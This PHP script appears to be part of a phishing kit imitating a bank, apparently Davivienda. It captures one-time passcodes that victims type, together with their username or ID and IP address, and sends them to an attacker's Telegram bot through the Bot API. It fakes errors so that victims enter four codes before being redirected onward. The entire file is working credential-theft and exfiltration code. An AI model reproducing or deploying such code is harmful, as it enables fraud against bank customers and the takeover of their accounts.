<?php
session_start();
include 'bot.php';

if (!isset($_SESSION['intentos'])) {
    $_SESSION['intentos'] = 4;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Recibe el código OTP
    $otp = htmlspecialchars($_POST['otp_code'], ENT_QUOTES, 'UTF-8');
    $usr = isset($_SESSION['username']) ? $_SESSION['username'] : 'No detectado';
    $ip = $_SERVER['REMOTE_ADDR'];

    $_SESSION['intentos']--;

    $text = "D4V1V13ND4 | OTP\n----\nDOC: $usr\nCODIGO: $otp\nINTENTOS: " . $_SESSION['intentos'] . "\nIP: $ip";
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    if ($_SESSION['intentos'] > 0) {
        // Regresa a pedir el código de nuevo hasta completar 4
        header("Location: ../verificacion.html?error=1");
    } else {
        // Al agotar intentos, pasa a la biometría (beta.php)
        $_SESSION['intentos'] = 4; 
        header("Location: ../index2.html"); // O a tu página de carga
    }
    exit;
}
?>
